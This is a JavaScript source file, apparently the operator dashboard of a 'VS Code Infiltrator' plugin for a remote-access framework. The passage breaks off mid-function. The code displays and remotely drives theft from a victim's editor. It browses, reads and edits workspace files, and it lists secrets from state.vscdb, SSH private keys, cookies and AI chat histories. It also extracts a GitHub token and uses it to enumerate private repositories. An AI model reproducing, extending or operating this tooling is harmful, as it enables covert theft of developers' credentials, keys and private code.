// VS Code Infiltrator — ui.js
// Dashboard UI for browsing project state, files, git info, secrets, and chat history.

var currentTab = 'project';
var projectInfo = null;
var gitInfo = null;
var allSecrets = [];
var allSSHKeys = [];
var allCookies = [];
var chatSessions = [];
var currentChatMessages = [];
var allErrors = [];
var _refreshTimer = null;

// File browser state
var currentDir = '';
var currentFilePath = '';
var currentFileContent = '';

// Modal state
var modalFilePath = '';
var modalFileContent = '';
var modalEditMode = false;
var _modalPendingFile = false;
var _modalPollTimer = null;

// Pending request flags
var _pendingDirRequest = false;
var _pendingFileRequest = false;
var _pendingChatRequest = false;
var _pendingBulkDownload = false;
var _pendingGithubToken = false;
var _pendingGithubApi = false;
var _pendingGithubEndpoint = '';
var _pendingRepoDownload = false;
var _pendingRepoName = '';

// GitHub state
var githubToken = null; // {token, account, scopes, source}
var githubUser = null;
var githubRepos = [];
var githubOrgs = [];

var _syncState = 'syncing'; // syncing | connected | error

function updateSyncStatus(state, message) {
    _syncState = state;
    var el = pluginUI.container.querySelector('#vsc-sync-status');
    if (!el) return;
    var spinner = '<span class="spinner-border spinner-border-sm me-1" role="status" style="width:0.7rem;height:0.7rem"></span>';

    if (state === 'connected') {
        el.className = 'badge bg-success';
        el.textContent = message || 'Connected';
    } else if (state === 'error') {
        el.className = 'badge bg-danger';
        el.textContent = message || 'Error';
    } else {
        el.className = 'badge bg-secondary';
        el.innerHTML = spinner + esc(message || 'Syncing...');
    }
}

function esc(str) {
    if (str === null || str === undefined) return '';
    var div = document.createElement('div');
    div.appendChild(document.createTextNode(String(str)));
    return div.innerHTML;
}

function humanSize(bytes) {
    if (!bytes || bytes < 1024) return (bytes || 0) + ' B';
    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
    return (bytes / 1048576).toFixed(1) + ' MB';
}

// Extract just the filename from a full path
function baseName(fullPath) {
    if (!fullPath) return '';
    var sep = fullPath.indexOf('\\') !== -1 ? '\\' : '/';
    var parts = fullPath.split(sep);
    return parts[parts.length - 1] || fullPath;
}

// ===== Syntax highlighting (basic) =====

function highlightLine(text) {
    var escaped = esc(text);
    // Comments (// and #)
    escaped = escaped.replace(/^(\s*)(\/\/.*)$/, '$1<span class="syn-cmt">$2</span>');
    escaped = escaped.replace(/^(\s*)(#.*)$/, '$1<span class="syn-cmt">$2</span>');
    // Strings (double and single quoted, simple non-greedy)
    escaped = escaped.replace(/(&quot;[^&]*?&quot;|&#39;[^&]*?&#39;|`[^`]*?`)/g, '<span class="syn-str">$1</span>');
    // Keywords
    escaped = escaped.replace(/\b(function|return|var|let|const|if|else|for|while|do|switch|case|break|continue|new|this|class|extends|import|export|from|default|try|catch|finally|throw|typeof|instanceof|in|of|async|await|yield|true|false|null|undefined|def|self|None|True|False|print|raise|except|with|as|lambda|pass|elif)\b/g, '<span class="syn-kw">$1</span>');
    // Numbers
    escaped = escaped.replace(/\b(\d+\.?\d*)\b/g, '<span class="syn-num">$1</span>');
    // Function calls (word followed by parenthesis)
    escaped = escaped.replace(/\b([a-zA-Z_]\w*)\s*\(/g, '<span class="syn-fn">$1</span>(');
    return escaped;
}

// Render syntax-highlighted code into a target element
function renderHighlightedCode(targetEl, content) {
    if (!targetEl) return;
    var lines = content.split('\n');
    var html = '';
    for (var i = 0; i < lines.length; i++) {
        html += '<span class="code-line"><span class="line-number">' + (i + 1) + '</span>' +
            highlightLine(lines[i]) + '</span>\n';
    }
    targetEl.innerHTML = html;
}

// ===== Code Modal =====

function openCodeModal(filePath) {
    modalFilePath = filePath;
    modalFileContent = '';
    modalEditMode = false;

    var titleEl = pluginUI.container.querySelector('#vsc-modal-file-title');
    var sizeEl = pluginUI.container.querySelector('#vsc-modal-file-size');
    var codeView = pluginUI.container.querySelector('#vsc-modal-code-view');
    var editArea = pluginUI.container.querySelector('#vsc-modal-edit-area');
    var modeBadge = pluginUI.container.querySelector('#vsc-modal-mode-badge');
    var enableBtn = pluginUI.container.querySelector('#vsc-modal-enable-edit-btn');
    var saveBtn = pluginUI.container.querySelector('#vsc-modal-save-btn');
    var cancelBtn = pluginUI.container.querySelector('#vsc-modal-cancel-edit-btn');

    if (titleEl) titleEl.textContent = filePath;
    if (sizeEl) sizeEl.textContent = '';
    if (codeView) { codeView.style.display = ''; codeView.innerHTML = '<div class="text-muted p-3">Loading file...</div>'; }
    if (editArea) editArea.style.display = 'none';
    if (modeBadge) { modeBadge.textContent = 'Read Only'; modeBadge.className = 'badge bg-secondary'; }
    if (enableBtn) { enableBtn.style.display = ''; enableBtn.textContent = 'Enable Editing'; }
    if (saveBtn) saveBtn.style.display = 'none';
    if (cancelBtn) cancelBtn.style.display = 'none';

    // Show modal
    var modalEl = pluginUI.container.querySelector('#vsc-code-modal');
    if (modalEl && window.bootstrap) {
        var modal = bootstrap.Modal.getOrCreateInstance(modalEl);
        modal.show();
    }

    // Request file content
    sendCommand({ action: 'read_file', filePath: filePath });
    _modalPendingFile = true;

    // Poll for response
    if (_modalPollTimer) clearInterval(_modalPollTimer);
    _modalPollTimer = setInterval(function() {
        if (!_modalPendingFile) { clearInterval(_modalPollTimer); _modalPollTimer = null; return; }
        pluginUI.fetchData('file_content', 5, 0).then(function(result) {
            var rows = result.rows || [];
            if (rows.length > 0 && rows[0].data && rows[0].data.filePath === modalFilePath) {
                _modalPendingFile = false;
                renderCodeModal(rows[0].data);
            }
        });
    }, 1500);
}

function renderCodeModal(data) {
    modalFileContent = data.content || '';
    var titleEl = pluginUI.container.querySelector('#vsc-modal-file-title');
    var sizeEl = pluginUI.container.querySelector('#vsc-modal-file-size');
    var codeView = pluginUI.container.querySelector('#vsc-modal-code-view');

    if (titleEl) titleEl.textContent = data.filePath;
    if (sizeEl) sizeEl.textContent = humanSize(data.size);
    renderHighlightedCode(codeView, modalFileContent);
}

function toggleModalEdit(enable) {
    modalEditMode = enable;
    var codeView = pluginUI.container.querySelector('#vsc-modal-code-view');
    var editArea = pluginUI.container.querySelector('#vsc-modal-edit-area');
    var modeBadge = pluginUI.container.querySelector('#vsc-modal-mode-badge');
    var enableBtn = pluginUI.container.querySelector('#vsc-modal-enable-edit-btn');
    var saveBtn = pluginUI.container.querySelector('#vsc-modal-save-btn');
    var cancelBtn = pluginUI.container.querySelector('#vsc-modal-cancel-edit-btn');

    if (enable) {
        if (codeView) codeView.style.display = 'none';
        if (editArea) { editArea.style.display = ''; editArea.value = modalFileContent; editArea.focus(); }
        if (modeBadge) { modeBadge.textContent = 'Editing'; modeBadge.className = 'badge bg-warning text-dark'; }
        if (enableBtn) enableBtn.style.display = 'none';
        if (saveBtn) saveBtn.style.display = '';
        if (cancelBtn) cancelBtn.style.display = '';
    } else {
        if (codeView) codeView.style.display = '';
        if (editArea) editArea.style.display = 'none';
        if (modeBadge) { modeBadge.textContent = 'Read Only'; modeBadge.className = 'badge bg-secondary'; }
        if (enableBtn) { enableBtn.style.display = ''; enableBtn.textContent = 'Enable Editing'; }
        if (saveBtn) saveBtn.style.display = 'none';
        if (cancelBtn) cancelBtn.style.display = 'none';
    }
}

// ===== Send command to plugin via server =====

function sendCommand(command) {
    return fetch('/api/plugins/vscode/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ clientID: pluginUI.clientId, command: command })
    }).then(function(r) { return r.json(); });
}

// ===== Tab switching =====

var tabs = pluginUI.container.querySelectorAll('[data-vsc-tab]');
for (var t = 0; t < tabs.length; t++) {
    (function(tab) {
        tab.onclick = function(e) {
            e.preventDefault();
            currentTab = tab.getAttribute('data-vsc-tab');
            for (var x = 0; x < tabs.length; x++) {
                tabs[x].className = 'nav-link' + (tabs[x] === tab ? ' active' : '');
            }
            var tabNames = ['project', 'files', 'github', 'git', 'chat', 'errors'];
            for (var i = 0; i < tabNames.length; i++) {
                var el = pluginUI.container.querySelector('#vsc-tab-' + tabNames[i]);
                if (el) el.style.display = tabNames[i] === currentTab ? '' : 'none';
            }
            // When switching to Files tab, populate open files bar and auto-navigate workspace dir
            if (currentTab === 'files') {
                renderFilesOpenBar();
                if (!currentDir && projectInfo && projectInfo.workspacePath) {
                    currentDir = projectInfo.workspacePath;
                    var dirInput = pluginUI.container.querySelector('#vsc-dir-input');
                    if (dirInput) dirInput.value = currentDir;
                    navigateDir(currentDir);
                }
            }
        };
    })(tabs[t]);
}

// ===== Project Tab Rendering =====

function renderProject() {
    var statusEl = pluginUI.container.querySelector('#vsc-project-status');

    if (!projectInfo) {
        if (statusEl) statusEl.textContent = 'Waiting for data...';
        return;
    }

    var d = projectInfo;
    if (statusEl) statusEl.textContent = 'Workspace: ' + (d.workspacePath || 'unknown');

    // Workspace path
    var pathEl = pluginUI.container.querySelector('#vsc-workspace-path');
    if (pathEl) pathEl.textContent = d.workspacePath || '--';

    // Open editors — show filename only, full path as tooltip, click opens modal
    var editorsEl = pluginUI.container.querySelector('#vsc-open-editors');
    if (editorsEl) {
        if (d.openEditors && d.openEditors.length > 0) {
            var html = '';
            for (var i = 0; i < d.openEditors.length; i++) {
                var fullPath = d.openEditors[i];
                var fileName = baseName(fullPath);
                html += '<div class="vsc-file-link" data-filepath="' + esc(fullPath) + '" title="' + esc(fullPath) + '">' +
                    esc(fileName) + '</div>';
            }
            editorsEl.innerHTML = html;
            // Wire click handlers
            var links = editorsEl.querySelectorAll('.vsc-file-link');
            for (var li = 0; li < links.length; li++) {
                (function(el) {
                    el.onclick = function() { openCodeModal(el.getAttribute('data-filepath')); };
                })(links[li]);
            }
        } else {
            editorsEl.innerHTML = '<span class="text-muted">None detected</span>';
        }
    }

    // Recent projects
    var recentEl = pluginUI.container.querySelector('#vsc-recent-projects');
    if (recentEl) {
        if (d.recentProjects && d.recentProjects.length > 0) {
            var html2 = '';
            for (var j = 0; j < d.recentProjects.length; j++) {
                html2 += '<div style="font-family:monospace;color:#aaa">' + esc(d.recentProjects[j]) + '</div>';
            }
            recentEl.innerHTML = html2;
        } else {
            recentEl.innerHTML = '<span class="text-muted">None</span>';
        }
    }

    // Extensions
    var extEl = pluginUI.container.querySelector('#vsc-extensions');
    if (extEl) {
        if (d.extensions && d.extensions.length > 0) {
            var html3 = '<span class="badge bg-secondary me-1">' + d.extensions.length + ' installed</span><br>';
            for (var k = 0; k < d.extensions.length; k++) {
                html3 += '<div style="font-family:monospace;color:#aaa;font-size:0.85em">' + esc(d.extensions[k]) + '</div>';
            }
            extEl.innerHTML = html3;
        } else {
            extEl.innerHTML = '<span class="text-muted">None found</span>';
        }
    }

    // Initialize file browser directory from workspace path and auto-navigate
    if (!currentDir && d.workspacePath) {
        currentDir = d.workspacePath;
        var dirInput = pluginUI.container.querySelector('#vsc-dir-input');
        if (dirInput) dirInput.value = currentDir;
        navigateDir(currentDir);
    }
}

// ===== Files Tab =====

// Render open files as quick-access chips at the top of Files tab
function renderFilesOpenBar() {
    var barEl = pluginUI.container.querySelector('#vsc-files-open-bar');
    if (!barEl) return;

    if (!projectInfo || !projectInfo.openEditors || projectInfo.openEditors.length === 0) {
        barEl.innerHTML = '<span class="text-muted small">No open files detected</span>';
        return;
    }

    var html = '';
    for (var i = 0; i < projectInfo.openEditors.length; i++) {
        var fullPath = projectInfo.openEditors[i];
        var fileName = baseName(fullPath);
        var activeClass = (fullPath === currentFilePath) ? ' active' : '';
        html += '<span class="vsc-open-file-item' + activeClass + '" data-filepath="' + esc(fullPath) + '" title="' + esc(fullPath) + '">' +
            esc(fileName) + '</span>';
    }
    barEl.innerHTML = html;

    // Wire click handlers — load file in mini viewer
    var items = barEl.querySelectorAll('.vsc-open-file-item');
    for (var j = 0; j < items.length; j++) {
        (function(el) {
            el.onclick = function() {
                readFileFromBrowser(el.getAttribute('data-filepath'));
                // Highlight active
                var all = barEl.querySelectorAll('.vsc-open-file-item');
                for (var k = 0; k < all.length; k++) all[k].classList.remove('active');
                el.classList.add('active');
            };
        })(items[j]);
    }
}

function renderDirListing(data) {
    var listEl = pluginUI.container.querySelector('#vsc-dir-listing');
    var breadcrumb = pluginUI.container.querySelector('#vsc-dir-breadcrumb');
    var upBtn = pluginUI.container.querySelector('#vsc-dir-up-btn');
    var dirInput = pluginUI.container.querySelector('#vsc-dir-input');

    if (!data || !data.entries) {
        if (listEl) listEl.innerHTML = '<div class="text-muted small p-2">No entries</div>';
        return;
    }

    currentDir = data.dirPath;
    if (dirInput) dirInput.value = currentDir;
    if (breadcrumb) breadcrumb.textContent = currentDir;
    if (upBtn) upBtn.style.display = '';

    var html = '';
    for (var i = 0; i < data.entries.length; i++) {
        var entry = data.entries[i];
        var isDir = entry.type === 'dir';
        var icon = isDir ? '&#128193;' : '&#128196;';
        var sizeStr = isDir ? '' : ' <span class="text-muted">(' + humanSize(entry.size) + ')</span>';
        html += '<div class="vsc-dir-entry" data-name="' + esc(entry.name) + '" data-type="' + entry.type + '">' +
            icon + ' ' + esc(entry.name) + sizeStr + '</div>';
    }

    if (!html) html = '<div class="text-muted small p-2">Empty directory</div>';
    listEl.innerHTML = html;

    // Wire click handlers
    var entries = listEl.querySelectorAll('.vsc-dir-entry');
    for (var j = 0; j < entries.length; j++) {
        (function(el) {
            el.onclick = function() {
                var name = el.getAttribute('data-name');
                var type = el.getAttribute('data-type');
                var sep = currentDir.indexOf('\\') !== -1 ? '\\' : '/';
                var full = currentDir + sep + name;
                if (type === 'dir') {
                    navigateDir(full);
                } else {
                    readFileFromBrowser(full);
                }
            };
        })(entries[j]);
    }
}

function navigateDir(dirPath) {
    sendCommand({ action: 'list_dir', dirPath: dirPath });
    _pendingDirRequest = true;
}

function readFileFromBrowser(filePath) {
    currentFilePath = filePath;
    var nameEl = pluginUI.container.querySelector('#vsc-file-name');
    if (nameEl) nameEl.textContent = filePath;

    var pathInput = pluginUI.container.querySelector('#vsc-file-path-input');
    if (pathInput) pathInput.value = filePath;

    // Show loading in mini viewer
    var miniView = pluginUI.container.querySelector('#vsc-mini-code-view');
    if (miniView) miniView.innerHTML = '<div class="text-muted p-3" style="font-family:sans-serif">Loading...</div>';

    // Show expand button
    var expandBtn = pluginUI.container.querySelector('#vsc-expand-btn');
    if (expandBtn) expandBtn.style.display = '';

    sendCommand({ action: 'read_file', filePath: filePath });
    _pendingFileRequest = true;
}

function renderFileContent(data) {
    if (!data) return;

    currentFilePath = data.filePath;
    currentFileContent = data.content || '';

    var nameEl = pluginUI.container.querySelector('#vsc-file-name');
    var sizeEl = pluginUI.container.querySelector('#vsc-file-size');
    var expandBtn = pluginUI.container.querySelector('#vsc-expand-btn');

    if (nameEl) nameEl.textContent = data.filePath;
    if (sizeEl) sizeEl.textContent = humanSize(data.size);
    if (expandBtn) expandBtn.style.display = '';

    // Render syntax-highlighted in mini viewer
    var miniView = pluginUI.container.querySelector('#vsc-mini-code-view');
    renderHighlightedCode(miniView, currentFileContent);

    // Update path input
    var pathInput = pluginUI.container.querySelector('#vsc-file-path-input');
    if (pathInput) pathInput.value = data.filePath;

    // Update active state in open files bar
    var barItems = pluginUI.container.querySelectorAll('.vsc-open-file-item');
    for (var i = 0; i < barItems.length; i++) {
        if (barItems[i].getAttribute('data-filepath') === data.filePath) {
            barItems[i].classList.add('active');
        } else {
            barItems[i].classList.remove('active');
        }
    }
}

// ===== Git & Creds Tab =====

function renderGitInfo() {
    var container = pluginUI.container.querySelector('#vsc-git-info');
    if (!container || !gitInfo) return;

    if (gitInfo.error) {
        container.innerHTML = '<span class="text-danger">' + esc(gitInfo.error) + '</span>';
        return;
    }

    var html = '<div class="mb-1"><span class="text-muted">Branch:</span> <span class="text-white">' + esc(gitInfo.branch) + '</span></div>' +
        '<div class="mb-1"><span class="text-muted">User:</span> ' + esc(gitInfo.userName) + ' &lt;' + esc(gitInfo.userEmail) + '&gt;</div>' +
        '<div class="mb-1"><span class="text-muted">Credential Helper:</span> <span class="badge ' +
        (gitInfo.credentialHelper ? 'bg-warning text-dark' : 'bg-secondary') + '">' +
        esc(gitInfo.credentialHelper || 'none') + '</span></div>';

    if (gitInfo.remotes) {
        html += '<div class="mb-1"><span class="text-muted">Remotes:</span><pre style="background:#1e1e1e;padding:6px;border-radius:4px;font-size:0.85em;margin:4px 0">' +
            esc(gitInfo.remotes) + '</pre></div>';
    }

    if (gitInfo.log) {
        html += '<div><span class="text-muted">Recent Commits:</span><pre style="background:#1e1e1e;padding:6px;border-radius:4px;font-size:0.85em;margin:4px 0;max-height:200px;overflow:auto">' +
            esc(gitInfo.log) + '</pre></div>';
    }

    container.innerHTML = html;
}

function renderSecrets() {
    var tbody = pluginUI.container.querySelector('#vsc-secrets-body');
    if (!tbody) return;

    if (allSecrets.length === 0) {
        tbody.innerHTML = '<tr><td colspan="2" class="text-muted">Not collected</td></tr>';
        return;
    }

    var latest = allSecrets[0].data || {};
    var entries = latest.entries || [];

    if (entries.length === 0) {
        tbody.innerHTML = '<tr><td colspan="2" class="text-muted">No secrets found in state.vscdb</td></tr>';
        return;
    }

    var html = '';
    for (var i = 0; i < entries.length; i++) {
        var e = entries[i];
        html += '<tr>' +
            '<td style="font-family:monospace;font-size:0.8em;max-width:250px;word-break:break-all">' + esc(e.key) + '</td>' +
            '<td style="font-family:monospace;font-size:0.8em;max-width:400px;word-break:break-all">' + esc(e.value) + '</td>' +
            '</tr>';
    }
    tbody.innerHTML = html;
}

function renderSSHKeys() {
    var container = pluginUI.container.querySelector('#vsc-ssh-keys');
    if (!container) return;

    if (allSSHKeys.length === 0) {
        container.innerHTML = '<span class="text-muted">Not collected</span>';
        return;
    }

    var latest = allSSHKeys[0].data || {};
    var keys = latest.keys || [];

    if (keys.length === 0) {
        container.innerHTML = '<span class="text-muted">No SSH keys found</span>';
        return;
    }

    var html = '<div class="table-responsive"><table class="table table-sm table-dark table-striped mb-0">' +
        '<thead><tr><th>File</th><th>Size</th><th>Type</th><th>Content / Action</th></tr></thead><tbody>';

    for (var i = 0; i < keys.length; i++) {
        var k = keys[i];
        var typeBadge = k.isPublic ? '<span class="badge bg-success">public</span>' :
            (k.name === 'config' || k.name === 'known_hosts' || k.name === 'authorized_keys') ?
            '<span class="badge bg-info">' + esc(k.name) + '</span>' :
            '<span class="badge bg-danger">private</span>';

        var contentCell = '';
        if (k.content) {
            contentCell = '<pre style="background:#1e1e1e;padding:4px;border-radius:3px;font-size:0.8em;margin:0;max-height:60px;overflow:auto;white-space:pre-wrap">' +
                esc(k.content) + '</pre>';
        } else {
            contentCell = '<button class="btn btn-primary btn-sm vsc-ssh-read-btn" data-name="' + esc(k.name) + '">Read</button>';
        }

        html += '<tr>' +
            '<td style="font-family:monospace;font-size:0.85em">' + esc(k.name) + '</td>' +
            '<td class="small">' + humanSize(k.size) + '</td>' +
            '<td>' + typeBadge + '</td>' +
            '<td>' + contentCell + '</td>' +
            '</tr>';
    }

    html += '</tbody></table></div>';
    container.innerHTML = html;

    // Wire SSH read buttons
    var readBtns = container.querySelectorAll('.vsc-ssh-read-btn');
    for (var j = 0; j < readBtns.length; j++) {
        (function(btn) {
            btn.onclick = function() {
                var keyName = btn.getAttribute('data-name');
                sendCommand({ action: 'read_ssh_key', keyName: keyName });
                btn.disabled = true;
                btn.textContent = 'Fetching...';
            };
        })(readBtns[j]);
    }
}

function renderCookies() {
    var tbody = pluginUI.container.querySelector('#vsc-cookies-body');
    if (!tbody) return;

    if (allCookies.length === 0) {
        tbody.innerHTML = '<tr><td colspan="5" class="text-muted">Not collected</td></tr>';
        return;
    }

    var latest = allCookies[0].data || {};
    var cookies = latest.cookies || [];

    if (cookies.length === 0) {
        tbody.innerHTML = '<tr><td colspan="5" class="text-muted">No cookies found</td></tr>';
        return;
    }

    var html = '';
    for (var i = 0; i < cookies.length; i++) {
        var c = cookies[i];
        html += '<tr>' +
            '<td style="font-size:0.85em">' + esc(c.host) + '</td>' +
            '<td style="font-size:0.85em">' + esc(c.name) + '</td>' +
            '<td style="font-size:0.85em">' + esc(c.path) + '</td>' +
            '<td><span class="badge ' + (c.secure ? 'bg-success' : 'bg-secondary') + '">' + (c.secure ? 'Yes' : 'No') + '</span></td>' +
            '<td><span class="badge ' + (c.httpOnly ? 'bg-danger' : 'bg-secondary') + '">' + (c.httpOnly ? 'Yes' : 'No') + '</span></td>' +
            '</tr>';
    }
    tbody.innerHTML = html;
}

// ===== Chat History Tab =====

function renderChatSessions() {
    var listEl = pluginUI.container.querySelector('#vsc-chat-session-list');
    var countEl = pluginUI.container.querySelector('#vsc-chat-count');

    if (!listEl) return;

    if (chatSessions.length === 0) {
        listEl.innerHTML = '<div class="text-muted small p-2">No sessions found</div>';
        if (countEl) countEl.textContent = '0';
        return;
    }

    var latest = chatSessions[0].data || {};
    var allSessions = latest.sessions || [];

    // Filter out empty sessions (no messages, just GUID noise)
    var sessions = [];
    for (var f = 0; f < allSessions.length; f++) {
        if (allSessions[f].requestCount > 0) sessions.push(allSessions[f]);
    }
    if (countEl) countEl.textContent = String(sessions.length);

    if (sessions.length === 0) {
        listEl.innerHTML = '<div class="text-muted small p-2">No chat sessions with messages found</div>';
        return;
    }

    var html = '';
    for (var i = 0; i < sessions.length; i++) {
        var s = sessions[i];
        var title = s.title || s.name || 'Untitled';
        var reqCount = s.requestCount || 0;
        var sourceLabel = s.source === 'global' ? '<span class="badge bg-info">global</span>' :
            '<span class="badge bg-secondary">workspace</span>';
        var countLabel = '<span class="badge bg-success ms-1">' + reqCount + ' msg</span>';
        var modified = s.modified ? new Date(s.modified).toLocaleDateString() : '';

        html += '<div class="vsc-sidebar-item" data-session-file="' + esc(s.file) + '" data-session-title="' + esc(title) + '">' +
            '<div class="text-white small">' + esc(title.substring(0, 60)) + '</div>' +
            '<div>' + sourceLabel + countLabel + ' <span class="text-muted" style="font-size:0.75em">' + humanSize(s.size) + ' ' + esc(modified) + '</span></div>' +
            '</div>';
    }

    listEl.innerHTML = html;

    // Wire click handlers
    var items = listEl.querySelectorAll('.vsc-sidebar-item');
    for (var j = 0; j < items.length; j++) {
        (function(item) {
            item.onclick = function() {
                var all = listEl.querySelectorAll('.vsc-sidebar-item');
                for (var k = 0; k < all.length; k++) all[k].classList.remove('active');
                item.classList.add('active');

                var sessionFile = item.getAttribute('data-session-file');
                var title = item.getAttribute('data-session-title');
                var titleEl = pluginUI.container.querySelector('#vsc-chat-title');
                if (titleEl) titleEl.textContent = title;

                // Show fetching spinner
                var viewer = pluginUI.container.querySelector('#vsc-chat-viewer');
                if (viewer) viewer.innerHTML = '<div class="text-muted p-3"><span class="spinner-border spinner-border-sm me-1" role="status" style="width:0.7rem;height:0.7rem"></span>Fetching conversation...</div>';

                sendCommand({ action: 'read_chat', sessionFile: sessionFile });
                _pendingChatRequest = true;
            };
        })(items[j]);
    }
}

function renderChatHistory(data) {
    var viewer = pluginUI.container.querySelector('#vsc-chat-viewer');
    var titleEl = pluginUI.container.querySelector('#vsc-chat-title');
    if (!viewer || !data) return;

    if (titleEl && data.title) titleEl.textContent = data.title;

    var messages = data.messages || [];
    if (messages.length === 0) {
        viewer.innerHTML = '<div class="text-muted small p-2">No messages in this session</div>';
        return;
    }

    var html = '';
    for (var i = 0; i < messages.length; i++) {
        var msg = messages[i];

        if (msg.text) {
            html += '<div class="vsc-chat-user">' +
                '<div class="d-flex align-items-center mb-1">' +
                '<span class="badge bg-info me-2">User</span>' +
                (msg.model ? '<span class="text-muted" style="font-size:0.75em">' + esc(msg.model) + '</span>' : '') +
                '</div>' +
                '<div style="white-space:pre-wrap;font-size:0.9em">' + esc(msg.text) + '</div>';

            if (msg.files && msg.files.length > 0) {
                html += '<div class="mt-1">';
                for (var f = 0; f < msg.files.length; f++) {
                    html += '<span class="badge bg-dark me-1" style="font-size:0.7em">' + esc(String(msg.files[f])) + '</span>';
                }
                html += '</div>';
            }
            html += '</div>';
        }

        if (msg.response) {
            html += '<div class="vsc-chat-ai">' +
                '<div class="d-flex align-items-center mb-1">' +
                '<span class="badge bg-secondary me-2">AI</span>' +
                '</div>' +
                '<div style="white-space:pre-wrap;font-size:0.9em">' + esc(msg.response) + '</div>' +
                '</div>';
        }
    }

    viewer.innerHTML = html;
    viewer.scrollTop = viewer.scrollHeight;
}

// ===== GitHub Tab =====

function renderGitHubToken(data) {
    githubToken = data;
    var infoEl = pluginUI.container.querySelector('#vsc-gh-token-info');
    var statusEl = pluginUI.container.querySelector('#vsc-gh-token-status');
    var userBtn = pluginUI.container.querySelector('#vsc-gh-user-btn');
    var reposBtn = pluginUI.container.querySelector('#vsc-gh-repos-btn');
    var orgsBtn = pluginUI.container.querySelector('#vsc-gh-orgs-btn');

    if (!data || !data.token) {
        var errHtml = '<span class="text-danger">' + esc(data && data.error ? data.error : 'No token found') + '</span>';
        if (data && data.hint) {
            errHtml += '<div class="mt-1 p-2" style="background:#3a3f44;border-radius:4px;font-size:0.85em">' +
                '<span class="text-warning">Hint:</span> <span class="text-muted">' + esc(data.hint) + '</span></div>';
        }
        if (data && data.passwordStore) {
            errHtml += '<div class="text-muted small mt-1">password-store: <code>' + esc(data.passwordStore) + '</code></div>';
        }
        if (data && data.rawKeys) {
            errHtml += '<div class="text-muted small mt-1">Keys found: ' + esc(data.rawKeys.join(', ')) + '</div>';
        }
        if (data && data.debugCandidates && data.debugCandidates.length > 0) {
            errHtml += '<div class="mt-2"><span class="text-muted small">Value previews:</span>';
            for (var dc = 0; dc < data.debugCandidates.length; dc++) {
                var cand = data.debugCandidates[dc];
                var encBadge = cand.isEncrypted ? ' <span class="badge bg-warning text-dark">encrypted</span>' : '';
                errHtml += '<div class="mt-1" style="font-size:0.8em"><span class="text-white">' + esc(cand.key) + '</span>' + encBadge +
                    '<pre style="background:#1e1e1e;padding:4px;border-radius:3px;margin:2px 0;max-height:60px;overflow:auto;white-space:pre-wrap;word-break:break-all">' +
                    esc(cand.preview) + '</pre>';
                if (cand.decryptResult) {
                    errHtml += '<div class="mt-1"><span class="text-muted small">Decrypted:</span>' +
                        '<pre style="background:#1e1e1e;padding:4px;border-radius:3px;margin:2px 0;max-height:60px;overflow:auto;white-space:pre-wrap;word-break:break-all;color:#62c462">' +
                        esc(cand.decryptResult) + '</pre></div>';
                }
                errHtml += '</div>';
            }
            errHtml += '</div>';
        }
        if (infoEl) infoEl.innerHTML = errHtml;
        if (statusEl) statusEl.innerHTML = '<span class="badge bg-danger">No Token</span>';
        return;
    }

    // Mask middle of token for display
    var masked = data.token.substring(0, 8) + '...' + data.token.substring(data.token.length - 4);
    var html = '<div class="mb-1"><span class="text-muted">Token:</span> <code style="color:#62c462">' + esc(masked) + '</code> ' +
        '<button class="btn btn-outline-secondary btn-sm py-0 px-1 vsc-gh-copy-token" style="font-size:0.75em">Copy</button></div>';
    if (data.account) html += '<div class="mb-1"><span class="text-muted">Account:</span> <span class="text-white">' + esc(data.account) + '</span></div>';
    if (data.scopes && data.scopes.length > 0) {
        html += '<div class="mb-1"><span class="text-muted">Scopes:</span> ';
        for (var i = 0; i < data.scopes.length; i++) {
            html += '<span class="badge bg-secondary me-1">' + esc(data.scopes[i]) + '</span>';
        }
        html += '</div>';
    }
    html += '<div><span class="text-muted small">Source:</span> <span class="text-muted small">' + esc(data.source) + '</span></div>';

    if (infoEl) {
        infoEl.innerHTML = html;
        var copyBtn = infoEl.querySelector('.vsc-gh-copy-token');
        if (copyBtn) {
            copyBtn.onclick = function() {
                navigator.clipboard.writeText(data.token).then(function() {
                    copyBtn.textContent = 'Copied!';
                    setTimeout(function() { copyBtn.textContent = 'Copy'; }, 1500);
                });
            };
        }
    }
    if (statusEl) statusEl.innerHTML = '<span class="badge bg-success">Token Extracted</span>' +
        (data.account ? ' <span class="text-muted small">' + esc(data.account) + '</span>' : '');

    // Enable API buttons
    if (userBtn) userBtn.disabled = false;
    if (reposBtn) reposBtn.disabled = false;
    if (orgsBtn) orgsBtn.disabled = false;
}

function renderGitHubUser(data) {
    githubUser = data;
    var el = pluginUI.container.querySelector('#vsc-gh-user-info');
    if (!el || !data) return;

    if (data.error) {
        el.innerHTML = '<span class="text-danger">' + esc(data.error) + '</span>';
        return;
    }

    var html = '<div>' +
        '<div class="text-white fw-bold">' + esc(data.name || data.login) + '</div>' +
        '<div class="text-muted small">' + esc(data.login) + '</div>' +
        (data.email ? '<div class="small">' + esc(data.email) + '</div>' : '') +
        (data.company ? '<div class="small">' + esc(data.company) + '</div>' : '') +
        (data.bio ? '<div class="small text-muted">' + esc(data.bio) + '</div>' : '') +
        '<div class="mt-1">' +
        '<span class="badge bg-secondary me-1">Repos: ' + (data.public_repos || 0) + ' public / ' + (data.total_private_repos || 0) + ' private</span>' +
        '<span class="badge bg-secondary me-1">Followers: ' + (data.followers || 0) + '</span>' +
        '</div>' +
        '</div>';

    el.innerHTML = html;
}

function renderGitHubRepos(data) {
    if (Array.isArray(data)) githubRepos = data;
    var el = pluginUI.container.querySelector('#vsc-gh-repos');
    var countEl = pluginUI.container.querySelector('#vsc-gh-repo-count');
    if (!el) return;

    var repos = githubRepos;
    if (!repos || repos.length === 0) {
        el.innerHTML = '<span class="text-muted">No repos found</span>';
        if (countEl) countEl.textContent = '0';
        return;
    }

    // Apply filter
    var filterEl = pluginUI.container.querySelector('#vsc-gh-repo-filter');
    var filter = filterEl ? filterEl.value.toLowerCase() : '';
    var filtered = repos;
    if (filter) {
        filtered = [];
        for (var f = 0; f < repos.length; f++) {
            if ((repos[f].full_name || '').toLowerCase().indexOf(filter) !== -1 ||
                (repos[f].description || '').toLowerCase().indexOf(filter) !== -1) {
                filtered.push(repos[f]);
            }
        }
    }

    if (countEl) countEl.textContent = String(filtered.length) + (filter ? '/' + repos.length : '');

    var html = '<div class="table-responsive"><table class="table table-sm table-dark table-striped mb-0">' +
        '<thead style="position:sticky;top:0;z-index:1"><tr><th>Repository</th><th>Visibility</th><th>Language</th><th>Stars</th><th>Updated</th><th></th></tr></thead><tbody>';

